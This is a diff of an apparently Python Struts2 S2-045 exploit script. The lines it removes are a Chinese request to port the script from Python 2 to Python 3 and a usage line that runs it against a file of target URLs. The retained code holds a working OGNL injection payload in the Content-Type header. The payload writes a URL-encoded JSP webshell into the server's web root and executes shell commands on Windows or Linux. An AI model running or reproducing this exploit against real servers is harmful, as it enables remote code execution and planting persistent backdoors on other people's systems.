@@ -1,6 +1,3 @@
-请将如下 python2 脚本转换成 python3 脚本
-
-```python
 #!/usr/bin/env python
 # -*- coding: utf-8 -*-
 # ------------------------------------------------------------------------------
@@ -43,8 +40,8 @@ class Pi_Struts2_045(object):
         self.webshell_txt_7 = '%3C%25%40page%20import%3D%22java.io.%2A%2Cjava.util.%2A%2Cjava.net.%2A%2Cjava.sql.%2A%2Cjava.text.%2A%22%25%3E%3C%25%40include%20file%3D%221t00ls.jsp%22%25%3E%3C%25%40include%20file%3D%222t00ls.jsp%22%25%3E%3C%25%40include%20file%3D%223t00ls.jsp%22%25%3E%3C%25%40include%20file%3D%224t00ls.jsp%22%25%3E%3C%25%40include%20file%3D%225t00ls.jsp%22%25%3E%3C%25%40include%20file%3D%226t00ls.jsp%22%25%3E'
         self.num = str(num)
         self.header["Content-Type"] = "%{(#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ccccc='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#path=#context.get('com.opensymphony.xwork2.dispatcher.HttpServletRequest').getSession().getServletContext().getRealPath('/')).(#shell='" + eval("self.webshell_txt_"+ self.num)+"').(new java.io.BufferedWriter(new java.io.FileWriter(#path+'/"+self.num+"t00ls.jsp').append(new java.net.URLDecoder().decode(#shell,'UTF-8'))).close()).(#cmd='echo \\\"write file to '+#path+'/"+ self.num +"t00ls.jsp\\\"').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}"
- 
- 
+
+
     def spost_exp(self, ck_url):
         """post payload"""
         # print self.header
@@ -92,12 +89,3 @@ def main():
  
 if __name__ == '__main__':
     main()
-```
-
-
----
-
-
-```bash
-python pi_struts2-045.py url.txt 8
-```
